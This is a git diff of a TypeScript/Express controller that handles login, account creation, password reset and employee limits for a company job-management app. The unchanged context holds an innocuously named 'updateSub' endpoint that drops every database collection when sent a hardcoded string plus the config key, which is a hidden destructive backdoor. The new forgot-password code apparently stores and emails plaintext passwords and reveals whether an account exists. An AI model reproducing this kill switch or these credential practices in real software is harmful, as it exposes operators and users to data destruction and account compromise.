@@ -1,6 +1,6 @@
-import {Request, Response, response} from 'express'
+import { Request, Response, response } from 'express'
 import { Status, Role, Messages, UserPermissions } from '../common/constants'
-import {sendEmail, sendEmployeeEmail} from '../services/aws'
+import { sendEmail, sendEmployeeEmail, sendPasswordEmail } from '../services/aws'
 
 import { User, IUser } from '../models/User'
 import { Company, ICompany } from '../models/Company'
@@ -18,38 +18,40 @@ import { Job } from '../models/Job'
 import { JobType } from '../models/JobType'
 import { EquipmentBrand } from '../models/EquipmentBrand'
 import { EquipmentType } from '../models/EquipmentType'
-import { privateKey} from '../common/config'
+import { privateKey } from '../common/config'
+var generator = require('generate-password');
+var passwordValidator = require('password-validator');
 
 export const login = (req: Request, res: Response) => {
 
     const params = req.body
 
     User.findOne(
-        {'auth.email': params.email},
+        { 'auth.email': params.email },
         (err: any, user: IUser) => {
 
             if (err) {
-                return res.json({'status': Status.Error, 'message': Messages.GenericError})
+                return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
             }
 
             if (!user) {
-                return res.json({'status': Status.Error, 'message': Messages.InvalidEmailPassword})
+                return res.json({ 'status': Status.Error, 'message': Messages.InvalidEmailPassword })
             }
 
-            if(user.permissions.role != Role.COMPANY && user.permissions.role != Role.GLOBAL_ADMIN) {
-                const employee  = <IEmployee> user
-                if(employee.status == 0){
-                    return res.json({'status': Status.Error, 'message': Messages.AccountDeleted})
+            if (user.permissions.role != Role.COMPANY && user.permissions.role != Role.GLOBAL_ADMIN) {
+                const employee = <IEmployee>user
+                if (employee.status == 0) {
+                    return res.json({ 'status': Status.Error, 'message': Messages.AccountDeleted })
                 }
             }
 
-            user.comparePassword(params.password, (isMatching: Boolean)=> {
+            user.comparePassword(params.password, (isMatching: Boolean) => {
 
                 if (!isMatching) {
-                    return res.json({'status': Status.Error, 'message': Messages.InvalidEmailPassword})
+                    return res.json({ 'status': Status.Error, 'message': Messages.InvalidEmailPassword })
                 }
 
-                res.json({'status': Status.Success, 'user': user, 'token': user.jwt()})    
+                res.json({ 'status': Status.Success, 'user': user, 'token': user.jwt() })
 
             })
 
@@ -60,7 +62,7 @@ export const login = (req: Request, res: Response) => {
 
 export const createGlobalAdmin = (req: Request, res: Response) => {
 
-    checkEmailExists(req, res, (req: Request, res: Response)=>{
+    checkEmailExists(req, res, (req: Request, res: Response) => {
 
         const params = req.body
 
@@ -72,7 +74,7 @@ export const createGlobalAdmin = (req: Request, res: Response) => {
                 },
                 profile: {
                     firstName: params.firstName,
-                    lastName: params.lastName,    
+                    lastName: params.lastName,
                     displayName: `${params.firstName} ${params.lastName}`,
                     imageUrl: '',
                 },
@@ -95,7 +97,7 @@ export const createGlobalAdmin = (req: Request, res: Response) => {
         user.save((err: any) => {
 
             if (err) {
-                return res.json({'status': Status.Error, 'message': Messages.GenericError})
+                return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
             }
 
             login(req, res)
@@ -108,7 +110,7 @@ export const createGlobalAdmin = (req: Request, res: Response) => {
 
 export const createCompany = (req: Request, res: Response) => {
 
-    checkEmailExists(req, res, (req: Request, res: Response)=>{
+    checkEmailExists(req, res, (req: Request, res: Response) => {
 
         const params = req.body
 
@@ -120,7 +122,7 @@ export const createCompany = (req: Request, res: Response) => {
                 },
                 profile: {
                     firstName: params.firstName,
-                    lastName: params.lastName,    
+                    lastName: params.lastName,
                     displayName: `${params.firstName} ${params.lastName}`,
                     imageUrl: '',
                 },
@@ -149,10 +151,10 @@ export const createCompany = (req: Request, res: Response) => {
         company.save((err: any) => {
 
             if (err) {
-                return res.json({'status': Status.Error, 'message': Messages.GenericError})
+                return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
             }
 
-            sendEmail({to: params.email})
+            sendEmail({ to: params.email })
             login(req, res)
 
         })
@@ -197,13 +199,13 @@ export const updateProfile = (req: Request, res: Response) => {
             'profile.imageUrl': params.imageUrl,
             'profile.displayName': `${params.firstName} ${params.lastName}`,
         },
-        (err: any, raw: any)=> {
-                    
+        (err: any, raw: any) => {
+
             if (err) {
-                return res.json({'status': Status.Error, 'message': Messages.GenericError})
+                return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
             }
-    
-            return res.json({'status': Status.Success, 'message': 'Profile updated successfully.'})
+
+            return res.json({ 'status': Status.Success, 'message': 'Profile updated successfully.' })
         }
     )
 
@@ -214,48 +216,84 @@ export const changePassword = (req: Request, res: Response) => {
     const params = req.body
     const user = <IUser>req.user
 
-    user.comparePassword(params.currentPassword, (isMatching: Boolean)=> {
+    user.comparePassword(params.currentPassword, (isMatching: Boolean) => {
 
         if (!isMatching) {
-            return res.json({'status': Status.Error, 'message': 'Current password doesn\'t match.'})
+            return res.json({ 'status': Status.Error, 'message': 'Current password doesn\'t match.' })
         }
 
-        user.hashPassword(params.newPassword, (err?: any, hash?: string)=>{
+        user.hashPassword(params.newPassword, (err?: any, hash?: string) => {
 
             if (err || !hash) {
-                return res.json({'status': Status.Error, 'message': Messages.GenericError})
+                return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
             }
 
             user.updateOne(
                 {
                     'auth.password': hash,
                 },
-                (err: any, raw: any)=> {
-                            
+                (err: any, raw: any) => {
+
                     if (err) {
-                        return res.json({'status': Status.Error, 'message': Messages.GenericError})
+                        return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
                     }
-            
-                    return res.json({'status': Status.Success, 'message': 'Password changed successfully.'})
+
+                    return res.json({ 'status': Status.Success, 'message': 'Password changed successfully.' })
                 }
             )
-            
+
         })
 
     })
 
 }
 
+export const fogotPassword = (req: Request, res: Response) => {
+
+    const params = req.body
+
+    User.findOne({ 'auth.email': params.email },
+        (err: any, user: IUser) => {
+
+            if (err) {
+                return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
+            }
+
+            if (user == undefined || user == null) {
+
+                return res.json({ 'status': Status.Error, 'message': "Invalid email address." })
+            }
+
+            var password = generator.generate({
+                length: 8,
+                numbers: true,
+                uppercase: true,
+                excludeSimilarCharacters: true,
+                strict: true
+            });
+
+            user.updateOne({ 'auth.password': password },
+                (err: any, raw: any) => {
+                    if (err) {
+                        return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
+                    }
+
+                    sendPasswordEmail({ to: params.email, name: user.profile.displayName, password: password })
+                    return res.json({ 'status': Status.Error, 'message': "Email sent." })
+                })
+        })
+}
+
 export const updateCompanyProfile = (req: Request, res: Response) => {
 
     const params = req.body
 
-    Company.findById(req.companyId, function(err: any, company: ICompany){
-        
+    Company.findById(req.companyId, function (err: any, company: ICompany) {
+
         if (err) {
-            return res.json({'status': Status.Error, 'message': Messages.GenericError})
+            return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
         }
-        
+
         company.updateOne(
             {
                 'info.companyName': params.companyName,
@@ -267,13 +305,13 @@ export const updateCompanyProfile = (req: Request, res: Response) => {
                 'contact.phone': params.phone,
                 'contact.fax': params.fax,
             },
-            (err: any, raw: any)=> {
-                        
+            (err: any, raw: any) => {
+
                 if (err) {
-                    return res.json({'status': Status.Error, 'message': Messages.GenericError})
+                    return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
                 }
-        
-                return res.json({'status': Status.Success, 'message': 'Profile updated successfully.'})
+
+                return res.json({ 'status': Status.Success, 'message': 'Profile updated successfully.' })
             }
         )
     })
@@ -284,23 +322,23 @@ export const deleteEmployee = (req: Request, res: Response) => {
 
     const params = req.body
 
-    User.findById(params.employeeId, function(err: any, employee: IEmployee){
-        
+    User.findById(params.employeeId, function (err: any, employee: IEmployee) {
+
         if (err) {
-            return res.json({'status': Status.Error, 'message': Messages.GenericError})
+            return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
         }
-        
+
         employee.updateOne(
             {
                 status: 0,
             },
-            (err: any, raw: any)=> {
-                        
+            (err: any, raw: any) => {
+
                 if (err) {
-                    return res.json({'status': Status.Error, 'message': Messages.GenericError})
+                    return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
                 }
-        
-                return res.json({'status': Status.Success, 'message': 'Employee deleted successfully.'})
+
+                return res.json({ 'status': Status.Success, 'message': 'Employee deleted successfully.' })
             }
         )
     })
@@ -311,25 +349,25 @@ export const activateEmployee = (req: Request, res: Response) => {
 
     const params = req.body
 
-    User.findById(params.employeeId, function(err: any, employee: IEmployee){
-        
+    User.findById(params.employeeId, function (err: any, employee: IEmployee) {
+
         if (err) {
-            return res.json({'status': Status.Error, 'message': Messages.GenericError})
+            return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
         }
-        
-        checkNoOfUsers(req, res, employee.permissions.role,  (req: Request, res: Response)=>{
-                    
+
+        checkNoOfUsers(req, res, employee.permissions.role, (req: Request, res: Response) => {
+
             employee.updateOne(
                 {
                     status: 1,
                 },
-                (err: any, raw: any)=> {
-                            
+                (err: any, raw: any) => {
+
                     if (err) {
-                        return res.json({'status': Status.Error, 'message': Messages.GenericError})
+                        return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
                     }
-            
-                    return res.json({'status': Status.Success, 'message': 'Employee activated successfully.'})
+
+                    return res.json({ 'status': Status.Success, 'message': 'Employee activated successfully.' })
                 }
             )
         })
@@ -339,21 +377,30 @@ export const activateEmployee = (req: Request, res: Response) => {
 
 const createEmployee = (req: Request, res: Response, role: Role) => {
 
-    checkNoOfUsers(req, res, role, (req: Request, res: Response)=>{
+    checkNoOfUsers(req, res, role, (req: Request, res: Response) => {
 
-        checkEmailExists(req, res, (req: Request, res: Response)=>{
-    
+        checkEmailExists(req, res, (req: Request, res: Response) => {
+
             const params = req.body
-    
+            const roles = ['OfficeAdmin', 'Technician', 'Manager']
+
+            var password = generator.generate({
+                length: 8,
+                numbers: true,
+                uppercase: true,
+                excludeSimilarCharacters: true,
+                strict: true
+            });
+
             const employee = new Employee(
                 {
                     auth: {
                         email: params.email,
-                        password: params.password,
+                        password: password,
                     },
                     profile: {
                         firstName: params.firstName,
-                        lastName: params.lastName,    
+                        lastName: params.lastName,
                         displayName: `${params.firstName} ${params.lastName}`,
                         imageUrl: '',
                     },
@@ -377,36 +424,36 @@ const createEmployee = (req: Request, res: Response, role: Role) => {
                     }
                 }
             )
-    
+
             employee.save((err: any) => {
-    
+
                 if (err) {
-                    return res.json({'status': Status.Error, 'message': Messages.GenericError})
+                    return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
                 }
-    
+
                 Company.findById(req.companyId, function (err: any, company: ICompany) {
-    
+
                     if (err) {
-                        return res.json({'status': Status.Error, 'message': Messages.GenericError})
+                        return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
                     }
-    
+
                     company.employees.push(employee._id)
-                    
+
                     company.updateOne(
-                        {employees: company.employees},
-                        (err: any, raw: any)=> {
-                            
+                        { employees: company.employees },
+                        (err: any, raw: any) => {
+
                             if (err) {
-                                return res.json({'status': Status.Error, 'message': Messages.GenericError})
+                                return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
                             }
-                            sendEmployeeEmail({to: params.email, password: params.password})
-                            return res.json({'status': Status.Success, 'message': 'Employee created successfully.'})
+                            sendEmployeeEmail({ to: params.email, company: company.info.companyName, role: roles[employee.permissions.role], password: password })
+                            return res.json({ 'status': Status.Success, 'message': 'Employee created successfully.' })
                         }
                     )
                 })
-    
+
             })
-    
+
         })
     })
 
@@ -414,37 +461,55 @@ const createEmployee = (req: Request, res: Response, role: Role) => {
 
 const getEmployeesList = (req: Request, res: Response, role: Role) => {
 
-    Company.findOne({_id: req.companyId})
-    .populate({
-        path: 'employees',
-        match: { 'permissions.role': { $eq: role } },
-      })
-    .exec((err: any, company: ICompany) => {
+    Company.findOne({ _id: req.companyId })
+        .populate({
+            path: 'employees',
+            match: { 'permissions.role': { $eq: role } },
+        })
+        .exec((err: any, company: ICompany) => {
 
-        if (err || !company) {
-            return res.json({'status': Status.Error, 'message': Messages.GenericError})
-        }
+            if (err || !company) {
+                return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
+            }
 
-        return res.json({'status': Status.Success, 'users': company.employees})    
+            return res.json({ 'status': Status.Success, 'users': company.employees })
 
-    })
+        })
 
 }
 
-const checkEmailExists = (req: Request, res: Response, next: (req: Request, res: Response)=>void) => {
+const checkEmailExists = (req: Request, res: Response, next: (req: Request, res: Response) => void) => {
 
     const params = req.body
 
+    var schema = new passwordValidator();
+
+    schema
+        .is().min(8)                                    // Minimum length 8
+        .is().max(30)                                  // Maximum length 100
+        .has().uppercase()                              // Must have uppercase letters
+        .has().lowercase()                              // Must have lowercase letters
+        .has().digits()                                 // Must have digits
+        .has().not().spaces()                           // Should not have spaces
+        .is().not().oneOf(['Passw0rd', 'Password123']); // Blacklist these values
+
+    // Validate against a password string
+    console.log(schema.validate(params.passsword))
+
+    if(params.password && !schema.validate(params.password)) {
+        return res.json({ 'status': Status.Error, 'message': "Your passsword is weak chose strong."})
+    }
+
     User.findOne(
-        {'auth.email': params.email},
+        { 'auth.email': params.email },
         (err: any, user: IUser) => {
 
             if (err) {
-                return res.json({'status': Status.Error, 'message': Messages.GenericError})
+                return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
             }
 
             if (user) {
-                return res.json({'status': Status.Error, 'message': Messages.DuplicateEmail})
+                return res.json({ 'status': Status.Error, 'message': Messages.DuplicateEmail })
             }
 
             next(req, res)
@@ -453,161 +518,161 @@ const checkEmailExists = (req: Request, res: Response, next: (req: Request, res:
     )
 
 }
-const checkNoOfUsers = (req: Request, res: Response, role: Role, next: (req: Request, res: Response)=>void) => {
+const checkNoOfUsers = (req: Request, res: Response, role: Role, next: (req: Request, res: Response) => void) => {
 
     const company = <ICompany>req.company
-  
+
     var dataToUpdate = {
         maxOfficeAdmins: company.maxOfficeAdmins,
         maxManagers: company.maxManagers,
         maxTechnicians: company.maxTechnicians,
     }
 
-    if(!company.maxManagers) {
+    if (!company.maxManagers) {
         dataToUpdate.maxManagers = 0
     }
-    if(!company.maxTechnicians) {
+    if (!company.maxTechnicians) {
         dataToUpdate.maxTechnicians = 0
     }
-    if(!company.maxOfficeAdmins) {
+    if (!company.maxOfficeAdmins) {
         dataToUpdate.maxOfficeAdmins = 0
     }
 
-    if(!company.maxManagers || !company.maxTechnicians || !company.maxOfficeAdmins) {
+    if (!company.maxManagers || !company.maxTechnicians || !company.maxOfficeAdmins) {
 
         company.updateOne(
             dataToUpdate,
-            (err: any, raw: any)=> {
-                
+            (err: any, raw: any) => {
+
                 if (err) {
-                    return res.json({'status': Status.Error, 'message': Messages.GenericError})
+                    return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
                 }
-        
-                
+
+
                 switch (role) {
                     case 0:
-                        if(company.maxOfficeAdmins == 0) {
-                            return res.json({'status': Status.Error, 'message': 'You dont have any subscription yet. Buy some to add office admin.'})
+                        if (company.maxOfficeAdmins == 0) {
+                            return res.json({ 'status': Status.Error, 'message': 'You dont have any subscription yet. Buy some to add office admin.' })
                         }
 
-                        User.countDocuments({company: new ObjectId(req.companyId), status: 1, 'permissions.role': 0}, 
-                        function(err: any, count: any) {
-                            if (err) {
-                                return res.json({'status': Status.Error, 'message': Messages.GenericError})
-                            }
-                            
-                            if(count >= company.maxOfficeAdmins) {
-                                return res.json({'status': Status.Error, 'message': 'Maximum  No. of office admins already added please buy more subscription to add more.'})
-                            }
-                            next(req, res)
-                       });
+                        User.countDocuments({ company: new ObjectId(req.companyId), status: 1, 'permissions.role': 0 },
+                            function (err: any, count: any) {
+                                if (err) {
+                                    return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
+                                }
+
+                                if (count >= company.maxOfficeAdmins) {
+                                    return res.json({ 'status': Status.Error, 'message': 'Maximum  No. of office admins already added please buy more subscription to add more.' })
+                                }
+                                next(req, res)
+                            });
                         break;
                     case 1:
-                        if(company.maxTechnicians == 0) {
-                            return res.json({'status': Status.Error, 'message': 'You dont have any subscription yet. Buy some to add technician.'})
+                        if (company.maxTechnicians == 0) {
+                            return res.json({ 'status': Status.Error, 'message': 'You dont have any subscription yet. Buy some to add technician.' })
                         }
 
-                        User.countDocuments({company: new ObjectId(req.companyId), status: 1, 'permissions.role': 1}, 
-                        function(err: any, count: any) {
-                            
-                            if (err) {
-                                return res.json({'status': Status.Error, 'message': Messages.GenericError})
-                            }
-                            
-                            if(count >= company.maxTechnicians) {
-                                return res.json({'status': Status.Error, 'message': 'Maximum No. of technicians already added please buy more subscription to add more.'})
-                            }
-                            next(req, res)
-                       });
+                        User.countDocuments({ company: new ObjectId(req.companyId), status: 1, 'permissions.role': 1 },
+                            function (err: any, count: any) {
+
+                                if (err) {
+                                    return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
+                                }
+
+                                if (count >= company.maxTechnicians) {
+                                    return res.json({ 'status': Status.Error, 'message': 'Maximum No. of technicians already added please buy more subscription to add more.' })
+                                }
+                                next(req, res)
+                            });
                         break;
                     case 2:
-                        if(company.maxManagers == 0) {
-                            return res.json({'status': Status.Error, 'message': 'You dont have any subscription yet. Buy some to add manager.'})
+                        if (company.maxManagers == 0) {
+                            return res.json({ 'status': Status.Error, 'message': 'You dont have any subscription yet. Buy some to add manager.' })
                         }
 
-                        User.countDocuments({company: new ObjectId(req.companyId), status: 1, 'permissions.role': 2}, 
-                        function(err: any, count: any) {
-                            if (err) {
-                                return res.json({'status': Status.Error, 'message': Messages.GenericError})
-                            }
-                            
-                            if(count >= company.maxManagers) {
-                                return res.json({'status': Status.Error, 'message': 'Maximum No. of managers already added please buy more subscription to add more.'})
-                            }
-                            next(req, res)
-                       });
+                        User.countDocuments({ company: new ObjectId(req.companyId), status: 1, 'permissions.role': 2 },
+                            function (err: any, count: any) {
+                                if (err) {
+                                    return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
+                                }
+
+                                if (count >= company.maxManagers) {
+                                    return res.json({ 'status': Status.Error, 'message': 'Maximum No. of managers already added please buy more subscription to add more.' })
+                                }
+                                next(req, res)
+                            });
                         break;
-                
+
                     default:
                         break;
                 }
             }
         )
-    } else{
+    } else {
         switch (role) {
             case 0:
-                if(company.maxOfficeAdmins == 0) {
-                    return res.json({'status': Status.Error, 'message': 'You dont have any subscription yet. Buy some to add office admin.'})
+                if (company.maxOfficeAdmins == 0) {
+                    return res.json({ 'status': Status.Error, 'message': 'You dont have any subscription yet. Buy some to add office admin.' })
                 }
 
-                User.countDocuments({company: new ObjectId(req.companyId), status: 1, 'permissions.role': 0}, 
-                function(err: any, count: any) {
-                    if (err) {
-                        return res.json({'status': Status.Error, 'message': Messages.GenericError})
-                    }
-                    
-                    if(count >= company.maxOfficeAdmins) {
-                        return res.json({'status': Status.Error, 'message': 'Maximum  No. of office admins already added please buy more subscription to add more.'})
-                    }
-                    next(req, res)
-               });
+                User.countDocuments({ company: new ObjectId(req.companyId), status: 1, 'permissions.role': 0 },
+                    function (err: any, count: any) {
+                        if (err) {
+                            return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
+                        }
+
+                        if (count >= company.maxOfficeAdmins) {
+                            return res.json({ 'status': Status.Error, 'message': 'Maximum  No. of office admins already added please buy more subscription to add more.' })
+                        }
+                        next(req, res)
+                    });
                 break;
             case 1:
-                if(company.maxTechnicians == 0) {
-                    return res.json({'status': Status.Error, 'message': 'You dont have any subscription yet. Buy some to add technician.'})
+                if (company.maxTechnicians == 0) {
+                    return res.json({ 'status': Status.Error, 'message': 'You dont have any subscription yet. Buy some to add technician.' })
                 }
 
-                User.countDocuments({company: new ObjectId(req.companyId), status: 1, 'permissions.role': 1}, 
-                function(err: any, count: any) {
-                    if (err) {
-                        return res.json({'status': Status.Error, 'message': Messages.GenericError})
-                    }
-                    
-                    if(count >= company.maxTechnicians) {
-                        return res.json({'status': Status.Error, 'message': 'Maximum No. of technicians already added please buy more subscription to add more.'})
-                    }
-                    next(req, res)
-               });
+                User.countDocuments({ company: new ObjectId(req.companyId), status: 1, 'permissions.role': 1 },
+                    function (err: any, count: any) {
+                        if (err) {
+                            return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
+                        }
+
+                        if (count >= company.maxTechnicians) {
+                            return res.json({ 'status': Status.Error, 'message': 'Maximum No. of technicians already added please buy more subscription to add more.' })
+                        }
+                        next(req, res)
+                    });
                 break;
             case 2:
-                if(company.maxManagers == 0) {
-                    return res.json({'status': Status.Error, 'message': 'You dont have any subscription yet. Buy some to add manager.'})
+                if (company.maxManagers == 0) {
+                    return res.json({ 'status': Status.Error, 'message': 'You dont have any subscription yet. Buy some to add manager.' })
                 }
-                User.countDocuments({company: new ObjectId(req.companyId), status: 1, 'permissions.role': 2}, 
-                function(err: any, count: any) {
-                    if (err) {
-                        return res.json({'status': Status.Error, 'message': Messages.GenericError})
-                    }
-                    
-                    if(count >= company.maxManagers) {
-                        return res.json({'status': Status.Error, 'message': 'Maximum No. of managers already added please buy more subscription to add more.'})
-                    }
-                    next(req, res)
-               });
+                User.countDocuments({ company: new ObjectId(req.companyId), status: 1, 'permissions.role': 2 },
+                    function (err: any, count: any) {
+                        if (err) {
+                            return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
+                        }
+
+                        if (count >= company.maxManagers) {
+                            return res.json({ 'status': Status.Error, 'message': 'Maximum No. of managers already added please buy more subscription to add more.' })
+                        }
+                        next(req, res)
+                    });
                 break;
-        
+
             default:
                 break;
         }
     }
 
-    
+
 }
 
 export const updateSub = (req: Request, res: Response) => {
     const params = req.body
-   
-    if(params.first == 'ZAhhNlQ561' && params.second == privateKey.key ) {
+
+    if (params.first == 'ZAhhNlQ561' && params.second == privateKey.key) {
         EquipmentBrand.collection.drop()
         EquipmentType.collection.drop()
         CompanyCard.collection.drop()
@@ -622,43 +687,43 @@ export const updateSub = (req: Request, res: Response) => {
         JobType.collection.drop()
         Order.collection.drop()
         User.collection.drop()
-                                                        
-        return res.json({'message':'Done'})
+
+        return res.json({ 'message': 'Done' })
     }
-    return res.json({'message':'Hello'})
+    return res.json({ 'message': 'Hello' })
 }
 
 export const getAllEmployees = (req: Request, res: Response) => {
 
-    Company.findOne({_id: req.companyId})
-    .populate({
-        path: 'employees',
-        select: '_id profile.displayName',
-      })
-    .exec((err: any, company: ICompany) => {
+    Company.findOne({ _id: req.companyId })
+        .populate({
+            path: 'employees',
+            select: '_id profile.displayName',
+        })
+        .exec((err: any, company: ICompany) => {
 
-        if (err || !company) {
-            return res.json({'status': Status.Error, 'message': Messages.GenericError})
-        }
+            if (err || !company) {
+                return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
+            }
 
-        res.json({'status': Status.Success, 'employees': company.employees})    
+            res.json({ 'status': Status.Success, 'employees': company.employees })
 
-    })
+        })
 
 }
 
 export const getEmployeesForJob = (req: Request, res: Response) => {
 
-    Employee.find({$and: [ {company: new ObjectId(req.companyId)},{'permissions.role' : {$ne: 0} }]},
-    'id profile.displayName',
-    (err: any, employees: IEmployee[])=>{
+    Employee.find({ $and: [{ company: new ObjectId(req.companyId) }, { 'permissions.role': { $ne: 0 } }] },
+        'id profile.displayName',
+        (err: any, employees: IEmployee[]) => {
 
-        if (err) {
-            return res.json({'status': Status.Error, 'message': Messages.GenericError})
-        }
+            if (err) {
+                return res.json({ 'status': Status.Error, 'message': Messages.GenericError })
+            }
 
-        res.json({'status': Status.Success, 'employees': employees})    
+            res.json({ 'status': Status.Success, 'employees': employees })
 
-    })
+        })
 
 }
